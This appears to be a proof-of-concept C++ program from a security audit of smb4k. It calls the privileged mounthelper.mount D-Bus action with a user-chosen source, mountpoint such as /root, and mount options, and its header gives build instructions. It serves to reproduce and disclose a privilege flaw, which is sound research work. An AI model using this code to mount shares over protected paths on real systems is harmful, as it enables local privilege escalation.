#include <iostream>
#include <KAuth/ExecuteJob>
#include <QFileInfo>
#include <QApplicationStatic>

/*
 * Matthias Gerstner <matthias.gerstner@suse.de>
 *
 * 2025-12-01
 *
 * Overview
 * ========
 *
 * Helper for reproducing smb4k security issues. This utility invokes the
 * mounthelper.mount D-Bus method, providing the arguments provided on the
 * command line. The action will only work when invoked from an active local
 * user session e.g. in a regular graphical session.
 *
 * Examples
 * ========
 *
 * # this shows  that the helper attempted to mount the file system on /root
 * # but failed, because the server is not available.
 * $ ./smb4k_mount smb://my.server.com/my/shared /root
 * mount failed: mount error: could not resolve address for my.server.com: Unknown error
 *
 * Compilation
 * ===========
 *
 * Compiling this standalone on openSUSE Tumbleweed requires a couple of
 * tweaks as shown below. For KF6 there exist not package config files, thus
 * switches need to be hard-coded here.
 *
 * ```
 * # install the smb4k package (not in Factory, only in KDE:Extra/smb4k)
 * $ zypper in /path/to/smb4k-4-0*.rpm
 * # install devel files for Qt and KAuth
 * zypper in kf6-kauth-devel qt6-core-devel
 *
 * g++ -std=c++17 smb4k_mount.cpp -osmb4k_mount \
 *  `pkg-config --cflags --libs Qt6Core` \
 *  -isystem /usr/include/KF6/KConfigCore -isystem /usr/include/KF6/KAuthCore \
 *  -isystem /usr/include/KF6/KCoreAddons -isystem /usr/include/KF6/KAuth \
 *  /usr/lib64/libKF6AuthCore.so.6.20.0 /usr/lib64/libKF6CoreAddons.so.6
 * ```
 */

int main(int argc, char **argv) {
	if (argc < 3) {
		std::cerr << argv[0] << " <source> <mountpoint> <options...>\n";
		return 1;
	}

	QCoreApplication app(argc, argv);
        QVariantMap args;

	args.insert(QStringLiteral("mh_command"), QStringLiteral("/sbin/mount.cifs"));
	args.insert(QStringLiteral("mh_url"), QString::fromStdString(argv[1]));
	args.insert(QStringLiteral("mh_mountpoint"), QString::fromStdString(argv[2]));

	QStringList options;
	for (int arg=3; arg < argc; arg++) {
		options << QString::fromStdString(argv[arg]);
	}
	args.insert(QStringLiteral("mh_options"), options);

        //
        // Create the mount action
        //
        KAuth::Action mountAction(QStringLiteral("org.kde.smb4k.mounthelper.mount"));
        mountAction.setHelperId(QStringLiteral("org.kde.smb4k.mounthelper"));
        mountAction.setArguments(args);

        KAuth::ExecuteJob *job = mountAction.execute();
        bool success = job->exec();
        if (success) {
            int errorCode = job->error();

            if (errorCode == 0) {
                // Get the error message
                QString errorMsg = job->data().value(QStringLiteral("mh_error_message")).toString();

                if (!errorMsg.isEmpty()) {
                    // No error handling needed, just report the error message.
			std::cerr << "mounting failed: " << errorMsg.toStdString() << "\n";
			return 1;
                }
            } else {
		std::cerr << "mounting failed with code " << errorCode << " (no error msg)\n";
		return 1;
            }
        } else {
		std::cerr << "action could not be started\n";
		return 1;
        }

	std::cout << "mounted!\n";
	return 0;
}
